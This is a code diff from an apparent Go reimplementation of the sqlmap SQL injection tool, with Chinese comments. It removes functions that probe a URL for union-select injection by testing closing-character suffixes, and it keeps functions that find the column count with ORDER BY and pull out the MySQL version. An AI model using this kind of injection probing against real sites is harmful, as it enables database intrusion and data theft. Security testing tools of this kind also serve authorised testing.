@@ -6,50 +6,10 @@ import (
 	"go-sqlmap/log"
 	"go-sqlmap/util"
 	"math/rand"
-	"os"
 	"strconv"
 	"strings"
 	"time"
 )
-
-// DetectUnionSelectSqlInject 检测是否存在Union Select注入
-func DetectUnionSelectSqlInject(url string, method string) (bool, string) {
-	for _, v := range constant.SuffixList {
-		innerUrl := url + v
-		code, _, body := util.Request(method, innerUrl, nil, nil)
-		if code != -1 {
-			if strings.Contains(strings.ToLower(string(body)),
-				strings.ToLower(constant.DetectedKeyword)) {
-				log.Info("detected union select sql injection!")
-				return true, innerUrl
-			}
-		}
-	}
-	log.Info("not detected union select sql injection!")
-	os.Exit(-1)
-	return false, ""
-}
-
-// GetSuffix 获取可能的闭合符号列表
-func GetSuffix(target string) (bool, []string) {
-	_, _, defaultBody := util.Request(constant.DefaultMethod, target, nil, nil)
-	var suffixList []string
-	for _, v := range constant.SuffixList {
-		condition := target + v + constant.UnionSelectSuffixCondition
-		_, _, conditionBody := util.Request(constant.DefaultMethod, condition, nil, nil)
-		payload := target + v + constant.UnionSelectSuffixPayload
-		_, _, payloadBody := util.Request(constant.DefaultMethod, payload, nil, nil)
-		// 双重验证只能尽量保证闭合符号正确，还需要OrderBy中验证
-		if string(defaultBody) == string(payloadBody) &&
-			string(defaultBody) == string(conditionBody) {
-			suffixList = append(suffixList, v)
-		}
-	}
-	if len(suffixList) > 0 {
-		return true, suffixList
-	}
-	return false, suffixList
-}
 
 // GetOrderByNum 用Order By语句检测出真正的闭合符号并得到列数
 func GetOrderByNum(suffixList []string, url string) (string, int) {
@@ -138,7 +98,7 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 		innerRes := util.SubstringFrom(body, pos.StartIndex)
 		// 根据随机数之后的第一个字符分割得到数据
 		result := strings.Split(innerRes, pos.EndIndexChar)[0]
-		log.Info("MySQL Version:" + result)
+		log.Info("mysql version:" + result)
 		return result
 	}
 	return ""
